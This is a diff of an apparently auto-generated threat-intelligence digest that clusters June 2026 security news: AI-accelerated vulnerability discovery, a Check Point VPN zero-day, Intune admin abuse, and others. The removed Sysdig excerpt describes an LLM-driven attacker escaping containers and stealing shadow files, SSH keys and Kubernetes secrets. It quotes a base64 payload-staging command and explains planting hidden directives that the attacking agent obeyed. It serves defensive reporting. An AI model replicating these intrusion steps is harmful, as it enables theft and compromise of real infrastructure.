speed of discovery. Â Frontier models make it easier to search large bodies of public code, including the open-source libraries that many companies depend on. That does not mean every bug in a library is exploitable, or that library bugs are where most vulnerabilities live. Exploitability still depends on how the code is used, whether attacker-controlled input can reach the vulnerable path, and the protections that sit around it. But widely used open-source libraries and frameworks give attackers a shared surface to study at scale. When a real, reachable vulnerability exists there, a model can help find it, reason about possible exploit paths, and generate proof-of-concept variants faster than maintainers and defenders can review every downstream use. The gap between when an attacker discovers a vulnerability and when defenders learn it exists is what worries us most. If you are not running these models against your own code, it is safe to assume someone else is. The second is exploit volume and adaptation. A model can pr
+Security & Identity Detecting and containing AI-powered threats with Google Security Operations agents June 9, 2026 Jon Ramsey VP & GM, Google Cloud Security Payal Chakravarty Director of Product Management, Google Cloud Contact Sales For inquiries regarding security, please contact us. Contact us To defend against the growing range of AI-accelerated threat actors, organizations need to be able to respond faster to outpace the adversary. Recently, we announced Google AI Threat Defense , an automated security system designed to help you continuously monitor for and stop AI-powered threats before they can impact your business. Based on Google’s own approach to today’s threats and vulnerability management, it’s centered on a four-step framework: Prepare, scan and prioritize, remediate, and monitor. Today, we’re sharing more details on how Google Security Operations works in concert with AI Threat Defense to monitor, detect, and respond to threats, particularly from code you do not own or can not patch. The remediation gap represents a critical vulnerability. According to M-Trends 2026 , the exploitation of vulnerabilities has become the most common initial infection vector. Notably, the report also indicates that the mean time to exploit has dropped to an estimated minus seven days, meaning exploitation frequently occurs even before a patch is officially released. Google Security Operations delivers vital operational fabric to autonomously contain active attacks across your entire environment. Google Security Operations supports AI Threat Defense to monitor, detect, and respond to threats. Engineered around a comprehensive approach that uses compensating controls with proactive security to strengthen operational resilience, Google Security Operations is built on a strategic, three-part approach to cross-environment visibility across your entire attack surface: Continuous and autonomous coverage analysis and detection generation Autonomous investigation, containment, and response Retroactive hunting Designed to help you see and respond to threats faster than ever before, we deliver these capabilities at machine-scale and machine-speed. Together with Google AI Threat Defense , we’re able to provide the autonomous platform you need to outpace AI-driven attacks. 1. Continuous and autonomous coverage analysis and detection generation While proactive defense can identify vulnerabilities before they can be exploited, there will be applications that you can not patch, as well as potential gaps in the time it takes to remediate vulnerabilities. The 2026 Verizon Data Breach Investigations Report underscores the magnitude of this challenge. In a study encompassing over 13,000 organizations, only 26% of vulnerabilities identified on the CISA Known Exploited Vulnerabilities (KEV) list had been fully remediated. Moreover, the median duration required to achieve full patching after detection stands at 43 days. Clearly, you still need continuous monitoring to detect threats in your environments. Detection Engineering agent. Results for illustrative purposes. The Detection Engineering agent in Google Security Operations can automatically translate new exploitation patterns of unpatched vulnerabilities into custom detections for your specific environment. Available in preview, it analyzes a diverse array of input sources to quickly and effectively recognize malicious activity, so you can uncover novel attack patterns evolving from new and unpatched vulnerabilities. The agent’s sources include Google Threat Intelligence (such as emerging threat intelligence, new attack patterns curated by Mandiant, offensive tool repositories, red and purple team reports, autonomous malware analysis, open-source detection repositories and blogs), and internal security telemetry. The workflow of the Detection Engineering agent. To automatically find and fill coverage gaps tailored to your environment, the agent proactively builds new rules and validates them with sy
 ```
 
 #### Corroborating sources (1)
 
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - Title: Defend against frontier cyber models: Cloudflare's architecture as customer zero
-  - Published: 2026-06-09T06:00:00+00:00
-  - Link: https://blog.cloudflare.com/frontier-model-defense/
-  - Summary: In our post about Project Glasswing, we made the argument that the architecture around a vulnerability matters more than the speed of the patch. Here we walk through what that architecture looks like, the threats it defends against, and how we run it ourselves as Cloudflare's customer zero.
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - Title: Detecting and containing AI-powered threats with Google Security Operations agents
+  - Published: 2026-06-09T16:00:00+00:00
+  - Link: https://cloud.google.com/blog/products/identity-security/detecting-and-containing-powered-threats-with-google-security-operations-agents/
+  - Summary: To defend against the growing range of AI-accelerated threat actors, organizations need to be able to respond faster to outpace the adversary. Recently, we announced Google AI Threat Defense , an automated security system designed to help you continuously monitor for and stop AI-powered threats before they can impact your business. Based on Google’s own approach to today’s threats and vulnerability management, it’s centered on a four-step framework: Prepare, scan and prioritize, remediate, and monitor. Today, we’re sharing more details on how Google Security Operations works in concert with AI Threat Defense to monitor, detect, and respond to threats, particularly from code you do not own or can not patch. The remediation gap represents a critical vulnerability. According to M-Trends 2026 , the exploitation of vulnerabilities has become the most common initial infection vector. Notably, the report also indicates that the mean time to exploit has dropped to an estimated minus seven days
+
+### Cluster 8326d4ae4a — score 9
+
+- Title: The Hidden Code Problem: How Unverified Smart Contracts Are Becoming a Preferred Target for Attackers
+- Source: Chainalysis (ransomware_ecrime_financial_crime)
+- Published: 2026-06-09T17:35:21+00:00
+- Link: https://www.chainalysis.com/blog/attackers-exploiting-unverified-smart-contracts/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- affected_industries: financial_services
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- affected_industries: financial_services
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Summary In the last six months, at least $36.7 million has been stolen from protocols whose source code was never… The post The Hidden Code Problem: How Unverified Smart Contracts Are Becoming a Preferred Target for Attackers appeared first on Chainalysis .
+```
+
+#### Full body
+
+```
+Crime The $100 Million Crypto “Looksmaxxing” Boom: How Chinese Cartel Suppliers Pivoted to the Gray-Market Peptide Ecosystem June 4, 2026
+```
+
+#### Corroborating sources (1)
+
+- **Chainalysis** (ransomware_ecrime_financial_crime)
+  - Title: The Hidden Code Problem: How Unverified Smart Contracts Are Becoming a Preferred Target for Attackers
+  - Published: 2026-06-09T17:35:21+00:00
+  - Link: https://www.chainalysis.com/blog/attackers-exploiting-unverified-smart-contracts/
+  - Summary: Summary In the last six months, at least $36.7 million has been stolen from protocols whose source code was never… The post The Hidden Code Problem: How Unverified Smart Contracts Are Becoming a Preferred Target for Attackers appeared first on Chainalysis .
 
 ### Cluster b380149528 — score 9
 
@@ -3474,18 +3721,16 @@ SoFi confirms third-party data breach at Hong Kong subsidiary By Lawrence Abrams
 - Source: BleepingComputer (cyber_news_breach_reporting)
 - Published: 2026-06-08T21:03:40+00:00
 - Link: https://www.bleepingcomputer.com/news/apple/new-apple-feature-automatically-changes-your-compromised-passwords/
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_products: Google/Gemini
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- affected_products: Google/Gemini
 - content_type: incident_report
 - confidence_tier: tier_4_news
 
@@ -3493,12 +3738,6 @@ SoFi confirms third-party data breach at Hong Kong subsidiary By Lawrence Abrams
 
 ```
 At WWDC 26, Apple announced an Apple Intelligence-powered feature that can automatically fix weak and compromised passwords. This works in Safari, and it's rolling out with iOS 27. [...]
-```
-
-#### Full body
-
-```
-New Apple feature automatically changes your compromised passwords By Mayank Parmar June 8, 2026 05:03 PM 3 At WWDC 2026, Apple announced an Apple Intelligence-powered feature that can automatically fix weak and compromised passwords. Right now, Safari and the built-in Apple Passwords app can automatically flag weak, duplicate, or compromised passwords. For example, if you enter a password when you're creating an account, Apple will warn you if it detects the password is weak, and Safari will help you create a secure password. However, Apple's built-in password manager or Safari does not try to automatically fix your weak or compromised passwords. This changes with a new AI-powered security feature. Apple says the built-in password app and Safari now use AI to "agentically" take action based on your behavior and secure your passwords automatically. Agentic password manager in iOS 27 Source: Apple This feature will launch with iOS 27 for the Passwords app and Safari, which can automatically update eligible accounts to strong passwords. Apple promises security and privacy with Apple Intelligence Apple argues that you don't have to worry about safety or privacy, as these features are powered by the next generation of Apple Foundation Models. Apple Intelligence privacy and security layer Source: Apple The foundation models are custom-built in collaboration with Google. Apple used Gemini models, likely its output, to fine-tune its own model and deeply integrated them into Apple Intelligence experiences. "These latest models run on device and on servers using Private Cloud Compute," Apple wrote in a blog post. "Every facet of the new Apple Intelligence architecture is built privacy-first, from the latest Apple Foundation Models to the core operating system technologies that integrate these models deep into Apple’s platforms." Most of these features run locally on new iPhones, but Apple also uses Private Cloud Compute to run some features in the cloud without sharing your personal data. "When Private Cloud Compute is handling users’ requests, their personal data is not stored nor made accessible to Apple or anyone else," Apple noted. Apple says Apple Intelligence improvements and an Agentic password manager are set to arrive with iOS 27 later this year. However, if you can't wait, you can sign up for the Developer Program and try the beta build today. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Apple fixes bug that let the FBI recover deleted Signal messages Over 20,000 Instagram accounts stolen in Meta AI support hack Replace your AI subs: 5 years of GPT, Claude & Gemini for only $90.99 Claude AI skills are becoming valuable fast—this learning course is just $20 right now Get GPT, Claude, Gemini, image tools, & more in one $60 lifetime app— only through 6/14
 ```
 
 #### Corroborating sources (1)
@@ -3515,22 +3754,20 @@ New Apple feature automatically changes your compromised passwords By Mayank Par
 - Source: Dark Reading (cyber_news_breach_reporting)
 - Published: 2026-06-08T20:28:35+00:00
 - Link: https://www.darkreading.com/vulnerabilities-threats/check-point-vpn-flaw-exploited-early-may
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ransomware_extortion, zero_day
-- cve_ids: CVE-2026-50751, CVE-2026-50752
-- urgency_signals: actively_exploited, zero_day
+- threat_categories: ransomware_extortion, zero_day
+- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
 #### Primary article taxonomy
-- threat_categories: ransomware_extortion, zero_day, active_exploitation
-- cve_ids: CVE-2026-50751, CVE-2026-50752
-- urgency_signals: actively_exploited, zero_day
+- threat_categories: ransomware_extortion, zero_day
+- urgency_signals: zero_day
 - content_type: news_report
 - confidence_tier: tier_4_news
 
@@ -3538,12 +3775,6 @@ New Apple feature automatically changes your compromised passwords By Mayank Par
 
 ```
 A newly discovered, critical zero-day vulnerability is under attack; a Qilin ransomware affiliate has been blamed for at least one incident.
-```
-
-#### Full body
-
-```
-Vulnerabilities & Threats Application Security Mobile Security Cyberattacks & Data Breaches News Check Point VPN Flaw Exploited Since Early May A newly discovered, critical zero-day vulnerability is under attack; a Qilin ransomware affiliate has been blamed for at least one incident. Alexander Culafi , Senior News Writer , Dark Reading June 8, 2026 3 Min Read Source: courtneyk via Getty Images A threat actor is exploiting a critical vulnerability present in certain versions of Check Point's Security Gateways and Spark Firewalls, and customers are advised to patch immediately. Check Point on June 8 disclosed CVE-2026-50751, a critical authentication bypass flaw (9.3 CVSS score) that impacts "Check Point Remote Access VPN and Mobile Access deployments configured to use the deprecated IKEv1 key exchange protocol," according to a blog post . The flaw was exploited in the wild in recent weeks as a zero-day in attacks against "a few dozen targeted organizations globally," the vendor said. Remote Access VPN and Mobile Access are both remote access capabilities generally offered as part of Check Point firewalls. IKEv1 (short for Internet Key Exchange version 1) is a security authentication protocol created in 1998 that is often used to set up authenticated and encrypted VPN tunnels. The protocol has been deprecated for years and other protocols, such as successor IKEv2, are generally recommended. Related: Russian Attackers Weaponize WinRAR Flaw Against Ukrainian Orgs "By exploiting a logic flaw in certificate validation, an attacker can establish a VPN session without possession of a valid password, effectively bypassing authentication requirements, the blog post read. "Additional post-authentication activity is required to access internal resources or escalate privileges." The vulnerability was disclosed alongside another flaw, tracked as CVE-2026-50752, involving a "condition in the certificate validation logic" of IKEv1, which can enable a man-in-the-middle attack on VPN site-to-site connections (7.4 CVSS score). CVE-2026-50751 is the more notable one of the two at this stage, as it's under active exploitation. Check Point Research said it confirmed one case where post-exploitation activity was associated with a Qilin ransomware affiliate. The suspected threat actor is financially motivated and "is exploiting other VPN related vulnerabilities such as the ones published by Palo Alto, Fortinet and F5." Check Point also identified indications that the attacker may be using Tox for communication, an otherwise legitimate open source peer-to-peer protocol, and that they used dedicated virtual private server (VPS) infrastructure to conduct attacks. Vulnerable Check Point Customers Should Patch Now The impacted gateway and firewall versions for both vulnerabilities are identical. They include Security Gateways R82.10 Jumbo Hotfix Take 19 or below; R82 Jumbo Hotfix Take 103 or below; R81.20 Jumbo Hotfix Take 141 or below; R81.10 (end of service); R81 (end of service); and R80.40 (end of service). Also included are Spark Firewalls R80.20.X (EOS); R81.10.X; and R82.00.X. Related: 4 Critical Threats Where Attackers Have the Advantage Check Point urged customers to apply hotfixes as soon as possible. Alternative mitigations, attack identifiers, and more are available in dedicated support pages for CVE-2026-50751 and CVE-2026-50752 , respectively. Alternative mitigations generally amount to changing VPN encryption settings to use IKEv2 only; CVE-2026-50751 also offers mitigations involving removing support for legacy Remote Access client connections or by setting the machine certificate authentication as mandatory. Check Point first identified malicious activity on June 4, and could identify an earliest observed exploitation date of May 7. Based on its observations, however, exploitation increased in early June. Incident response teams should "prioritize forensic log audits and configuration reviews starting from the earliest observed exploitati
 ```
 
 #### Corroborating sources (1)
@@ -3554,48 +3785,13 @@ Vulnerabilities & Threats Application Security Mobile Security Cyberattacks & Da
   - Link: https://www.darkreading.com/vulnerabilities-threats/check-point-vpn-flaw-exploited-early-may
   - Summary: A newly discovered, critical zero-day vulnerability is under attack; a Qilin ransomware affiliate has been blamed for at least one incident.
 
-### Cluster e888849564 — score 9
-
-- Title: 2026 Verizon DBIR: vulnerability exploitation overtakes stolen credentials as #1 breach entry point for the first time in 19 years
-- Source: Reddit r/cybersecurity (reddit_practitioner_osint)
-- Published: 2026-06-08T19:56:38+00:00
-- Link: https://www.reddit.com/r/cybersecurity/comments/1u0iwng/2026_verizon_dbir_vulnerability_exploitation/
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng, supply_chain
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- threat_categories: supply_chain, phishing_social_eng, data_breach
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-Verizon's 2026 Data Breach Investigations Report dropped and a few numbers stand out: - Vulnerability exploitation now 31% of initial access, surpassing stolen credentials for the first time in 19 years of the report - Human element still present in 62% of breaches (up from 60%) - Mobile-centric social engineering up 40% year over year - Shadow AI use by employees tripled to 45% - Third-party / supply chain involvement jumped 60%, now in 48% of breaches The mobile social engineering jump is the one I find most interesting. As people get better at spotting traditional email phishing, attackers are pivoting to SMS, voice, and messaging apps, and that's where most awareness programs still have the biggest gap. Where do you think the next investment should go: patching cadence, layered controls on mobile, expanding awareness beyond email, or something else? submitted by /u/masterm1nd_game [link] [comments]
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/cybersecurity** (reddit_practitioner_osint)
-  - Title: 2026 Verizon DBIR: vulnerability exploitation overtakes stolen credentials as #1 breach entry point for the first time in 19 years
-  - Published: 2026-06-08T19:56:38+00:00
-  - Link: https://www.reddit.com/r/cybersecurity/comments/1u0iwng/2026_verizon_dbir_vulnerability_exploitation/
-  - Summary: Verizon's 2026 Data Breach Investigations Report dropped and a few numbers stand out: - Vulnerability exploitation now 31% of initial access, surpassing stolen credentials for the first time in 19 years of the report - Human element still present in 62% of breaches (up from 60%) - Mobile-centric social engineering up 40% year over year - Shadow AI use by employees tripled to 45% - Third-party / supply chain involvement jumped 60%, now in 48% of breaches The mobile social engineering jump is the one I find most interesting. As people get better at spotting traditional email phishing, attackers are pivoting to SMS, voice, and messaging apps, and that's where most awareness programs still have the biggest gap. Where do you think the next investment should go: patching cadence, layered controls on mobile, expanding awareness beyond email, or something else? submitted by /u/masterm1nd_game [link] [comments]
-
 ### Cluster 04483ccd70 — score 8
 
 - Title: The Privileged Roles Nobody Talks About
 - Source: TrustedSec (detection_response_operations)
 - Published: 2026-06-04T04:00:00+00:00
 - Link: https://trustedsec.com/blog/the-privileged-roles-nobody-talks-about
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
@@ -3614,12 +3810,6 @@ Verizon's 2026 Data Breach Investigations Report dropped and a few numbers stand
 <p>Part 1: Why Your MDM Platform is a Tier 0 AssetThis is Part 1 of a two-part series on Intune security hardening. This post covers what we have seen in real world attacks as well as attack paths our Pentest Team has…</p>
 ```
 
-#### Full body
-
-```
-Blog The Privileged Roles Nobody Talks About June 04, 2026 The Privileged Roles Nobody Talks About Written by Carlos Perez Incident Response Mobile Security Assessment Table of contents What Happens The Real Lesson: Platform Admins are God-Tier Roles The Pattern That Keeps Repeating It’s Not Just Intune What You Should Be Doing for Intune, Right Now ATT&amp;amp;CK Technique Mapping If You Only Do Five Things The Bigger Picture Up Next: Part 2, the Implementation Guide Part 1: Why Your MDM Platform is a Tier 0 Asset This is Part 1 of a two-part series on Intune security hardening. This post covers what we have seen in real world attacks as well as attack paths our Pentest Team has leveraged, why platform administration roles are systematically underprotected, and what controls you need in place. Part 2 (coming soon) covers the step-by-step implementation: configuration walkthroughs, decision flowcharts, and validation testing for each control. If you work in Incident Response long enough, you stop being surprised by the how of attacks and start paying more attention to the why these types of attacks are possible in the first place . When we perform leverage this attack path it makes every security team stop and rethink assumptions about what "privileged access" actually means in their environment. On-prem, we have seen the same, often with System Center Configuration Manager ( SCCM) and other platforms, but now we see that with solutions with wipe capability they pose an even greater lower bar to cause malicious impact. Let me break down what attackers have leveraged, why it matters beyond the headlines, and what the real operational takeaway is, especially if your organization relies on Microsoft Intune. What Happens The attack vector we have started to see is a legitimate feature of the management platform, executed from a compromised privileged account. Intune in this case does exactly what it was designed to do. The failure we see often is in who had the keys and how those keys were protected. Figure 1 - Combined High-Fidelity Sentinel Analytics Rule The Real Lesson: Platform Admins are God-Tier Roles This is where I want to focus, because this is the conversation the industry keeps avoiding. When we talk about high-privilege roles in an environment, the usual suspects come up immediately: Domain Admins, Enterprise Admins, Tenant Global Admins, maybe your virtualization platform admins (vCenter, Hyper-V). These are the roles that make it into risk assessments, into tiered access models, into the conversations about Privileged Access Workstations and just-in-time elevation. We recommend this often to customers who have been victims of these types of attacks. To my surprise, there is always a level of pushback even after this has been abused and machines have been encrypted. But here is what too many organizations miss: The people who administer your Mobile Device Management (MDM) platform, your configuration management tools, and your application deployment systems hold power over your infrastructure that is functionally equivalent to a Domain Admin. In many cases, it exceeds it. Think about what an Intune administrator can do: Deploy arbitrary PowerShell scripts to every enrolled Windows device, executed as SYSTEM at startup Push configuration profiles that modify security baselines, firewall rules, credential policies Issue remote wipe commands (full device factory resets) across the entire fleet Deploy and remove applications silently, including security tooling Modify compliance policies that determine whether a device can access corporate resources Manage certificates and authentication configurations across all enrolled endpoints This is not a support role. This is infrastructure-level control. And yet, in how many organizations are the Intune admin accounts treated with the same rigor as the Domain Admin accounts? How many organizations have their Intune administrators operating from the same workstation they use to c
-```
-
 #### Corroborating sources (1)
 
 - **TrustedSec** (detection_response_operations)
@@ -3628,34 +3818,57 @@ Blog The Privileged Roles Nobody Talks About June 04, 2026 The Privileged Roles 
   - Link: https://trustedsec.com/blog/the-privileged-roles-nobody-talks-about
   - Summary: <p>Part 1: Why Your MDM Platform is a Tier 0 AssetThis is Part 1 of a two-part series on Intune security hardening. This post covers what we have seen in real world attacks as well as attack paths our Pentest Team has…</p>
 
+### Cluster 3475095520 — score 8
+
+- Title: Defend against frontier cyber models: Cloudflare's architecture as customer zero
+- Source: Cloudflare Security (cloud_identity_infrastructure)
+- Published: 2026-06-09T06:00:00+00:00
+- Link: https://blog.cloudflare.com/frontier-model-defense/
+- Fetch status: not_attempted
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+In our post about Project Glasswing, we made the argument that the architecture around a vulnerability matters more than the speed of the patch. Here we walk through what that architecture looks like, the threats it defends against, and how we run it ourselves as Cloudflare's customer zero.
+```
+
+#### Corroborating sources (1)
+
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - Title: Defend against frontier cyber models: Cloudflare's architecture as customer zero
+  - Published: 2026-06-09T06:00:00+00:00
+  - Link: https://blog.cloudflare.com/frontier-model-defense/
+  - Summary: In our post about Project Glasswing, we made the argument that the architecture around a vulnerability matters more than the speed of the patch. Here we walk through what that architecture looks like, the threats it defends against, and how we run it ourselves as Cloudflare's customer zero.
+
 ### Cluster ad4a52246a — score 8
 
 - Title: Agentic threat actor hits the orchestration plane: AI agent-driven container escape
 - Source: Sysdig (detection_response_operations)
 - Published: 2026-06-04T00:00:00+00:00
 - Link: https://webflow.sysdig.com/blog/agentic-threat-actor-hits-the-orchestration-plane-ai-agent-driven-container-escape
-- Fetch status: ok
+- Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- affected_products: AWS, Kubernetes
-- cve_ids: CVE-2026-39987
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- affected_products: AWS, Kubernetes
-- cve_ids: CVE-2026-39987
 - content_type: news_report
 - confidence_tier: tier_2_operator
-
-#### Full body
-
-```
-< back to blog Agentic threat actor hits the orchestration plane: AI agent-driven container escape Published by: Michael Clark Director of Threat Research @ linkedin READ MORE RESEARCH Published: June 4, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more On May 29, 2026, the Sysdig Threat Research Team (TRT) observed a threat actor exploiting a vulnerable marimo notebook (CVE-2026-39987) and driving a fully automated kill chain that moved beyond the application. Every stage bears the fingerprints of an agentic threat actor (ATA), an attacker whose operations are driven by a large language model (LLM) harness rather than a human at a keyboard. During this operation, the Sysdig TRT observed the ATA: Enumerating the host Docker socket. Probing a kernel-level privilege-escalation path through Copy Fail. Creating privileged containers to break out onto the host. Reading the host shadow file and SSH keys. Replaying a stolen Kubernetes service-account token to dump the cluster's entire Secret store. What separates this attacker from the LLM-driven operators that the Sysdg TRT has previously profiled against the same marimo vulnerability is where the agent goes. Earlier agents treated the compromised notebook as a credential-pivot device toward AWS. This ATA dives down into the container and orchestration plane, using a mounted Docker socket as an escape primitive, breaking out to the host with nsenter, and replaying a Kubernetes service account token. This is the first operator we have observed where an agent harness, not a human, performs container escape and Kubernetes credential replay. The agentic signature Two independent signals establish this attack as agent-driven, even before any of its post-exploitation tradecraft is considered. First, the operator's agent parsed a correlation message that included a canary planted in a JSON error response and acted on it by issuing a follow-up request to the endpoint referenced by the token. A human reviewing a response body skips over such embedded directives; only a client parsing the entire response stream as authoritative context acts on them. Separately, the operator's terminal tooling echoed back an invisible, escape-sequence-wrapped directive embedded in the shell stream, confirming a tool reading the raw byte stream rather than a rendered terminal that a human reads. Second, the command stream itself is mechanically scripted, not typed. Payloads are staged as base64 written in chunks to a temporary file, decoded, and executed ( base64 -d /tmp/r_.b64 > /tmp/r_.py; python3 /tmp/r_.py ). Before trusting that channel with live code, the attacking agent unit-tested it: It wrote throwaway canary payloads (the base64 for hello, then a chunked hello followed by world to confirm that append-and-decode round-tripped) and decoded them, delivering the real escape and Kubernetes scripts only once the staging harness was proven to work. Each probe block is delimited with explicit section markers ( echo "===SHADOW===", echo "===SSH===" ) so the next agent turn can slice the output, the same parseable-boundary convention we have catalogued across other LLM-driven operators. Probes are issued with high retry multipliers and adapt to prior results between turns. An attacker that validates its own delivery mechanism with disposable canaries before use is behaving like an autonomous harness, not a human at an interactive shell. What we observed Phase 1: Escape-vector enumeration and Docker-socket breakout After establishing the shell, the attacking agent ran a battery of probes mapping its container context and every available breakout primitive before attempting any escape. Each sweep is one command, each check fronted by an underscore-delimited section marker ( SOCK , CAPS , CORE , AFALG , K8S ) so the next agent turn can slic
-```
 
 #### Corroborating sources (1)
 
@@ -3663,90 +3876,6 @@ Blog The Privileged Roles Nobody Talks About June 04, 2026 The Privileged Roles 
   - Title: Agentic threat actor hits the orchestration plane: AI agent-driven container escape
   - Published: 2026-06-04T00:00:00+00:00
   - Link: https://webflow.sysdig.com/blog/agentic-threat-actor-hits-the-orchestration-plane-ai-agent-driven-container-escape
-
-### Cluster 271e39f9cb — score 8
-
-- Title: Check Point links VPN zero-day attacks to Qilin ransomware gang
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-08T13:05:16+00:00
-- Link: https://www.bleepingcomputer.com/news/security/check-point-links-vpn-zero-day-attacks-to-qilin-ransomware-gang/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: active_exploitation, ransomware_extortion, zero_day
-- affected_products: Palo Alto Networks
-- cve_ids: CVE-2026-50751, CVE-2026-50752
-- urgency_signals: actively_exploited, preauth_unauth, zero_day
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, zero_day, active_exploitation
-- affected_products: Palo Alto Networks
-- cve_ids: CVE-2026-50751, CVE-2026-50752
-- urgency_signals: actively_exploited, zero_day, preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Israeli cybersecurity company Check Point has released security updates to patch a critical flaw affecting Remote Access VPN and Mobile Access deployments, which was exploited in zero-day attacks. [...]
-```
-
-#### Full body
-
-```
-Check Point links VPN zero-day attacks to Qilin ransomware gang By Sergiu Gatlan June 8, 2026 09:05 AM 0 Israeli cybersecurity company Check Point has released security updates to patch a critical flaw affecting Remote Access VPN and Mobile Access deployments, which was exploited in zero-day attacks. Tracked as CVE-2026-50751 , this vulnerability can be exploited by unauthenticated, remote attackers to bypass authentication on targeted Mobile Access / SSL VPNs, Remote Access VPNs, or Spark firewalls and establish a remote access VPN connection. According to the company, this security flaw affects only deployments configured to use the deprecated IKEv1 key exchange protocol, with security gateways that accept legacy Remote Access clients and do not require a machine certificate for connections. The attacks began on May 7, surged in early June, and have affected only "a few dozen" organizations worldwide, with at least one incident linked to the Qilin ransomware operation. "Check Point Research has identified active exploitation of CVE-2026-50751, a critical authentication bypass vulnerability affecting Check Point Remote Access VPN and Mobile Access deployments configured to use the deprecated IKEv1 key exchange protocol," the company warned . "To date, the observed exploitation has been limited to a few dozen targeted organizations globally. One case involved confirmed post-compromise activity associated with Qilin ransomware affiliate. Customers using IKEv1 key exchange protocol are strongly encouraged to apply the available security updates immediately." Check Point also shared mitigation measures for customers who can't immediately patch vulnerable systems and advised them to remove support for the legacy remote access client, configure global properties for Remote Access VPN Authentication to IKEv2 only, set the Machine Certificate Authentication as mandatory, and enable IPS and download the signatures. While investigating the CVE-2026-50751 flaw, Check Point found a second vulnerability ( tracked as CVE-2026-50752 ) that affects certificate validation in deprecated IKEv1 key exchange that can be exploited in man-in-the-middle attacks on site-to-site VPN connections. Although Check Point has not yet found evidence of CVE-2026-50752 exploitation in the wild, it advised customers to apply updates to mitigate potential exposure. Qilin surfaced in August 2022 as a Ransomware-as-a-Service (RaaS) operation under the "Agenda" name and has since claimed responsibility for nearly 400 victims on its dark web leak site. The gang's list of victims also includes high-profile organizations such as automotive giant Yangfeng , Nissan , Japanese beer company Asahi , publishing giant Lee Enterprises , pathology services provider Synnovis , and Australia's Court Services Victoria . Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: CISA gives feds 3 days to patch Check Point VPN bug exploited as zero-day Palo Alto Networks firewall zero-day exploited for nearly a month Palo Alto Networks warns of firewall RCE zero-day exploited in attacks Google fixes one actively exploited Android zero-day, 124 flaws Palo Alto GlobalProtect VPN auth bypass flaw now exploited in attacks
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Check Point links VPN zero-day attacks to Qilin ransomware gang
-  - Published: 2026-06-08T13:05:16+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/check-point-links-vpn-zero-day-attacks-to-qilin-ransomware-gang/
-  - Summary: Israeli cybersecurity company Check Point has released security updates to patch a critical flaw affecting Remote Access VPN and Mobile Access deployments, which was exploited in zero-day attacks. [...]
-
-### Cluster c5dcdf8121 — score 8
-
-- Title: Oxford University discloses data breach after careers platform hack
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-06-08T11:14:41+00:00
-- Link: https://www.bleepingcomputer.com/news/security/oxford-university-discloses-data-breach-after-careerconnect-platform-hack/
-- Fetch status: not_attempted
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach
-- affected_industries: education
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: data_breach
-- affected_industries: education
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The University of Oxford disclosed a new data breach last week after being informed by its third-party provider, Group GTI, that its CareerConnect career services platform had been compromised. [...]
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: Oxford University discloses data breach after careers platform hack
-  - Published: 2026-06-08T11:14:41+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/oxford-university-discloses-data-breach-after-careerconnect-platform-hack/
-  - Summary: The University of Oxford disclosed a new data breach last week after being informed by its third-party provider, Group GTI, that its CareerConnect career services platform had been compromised. [...]
 
 ### Cluster 1f35b1cc5b — score 8
 
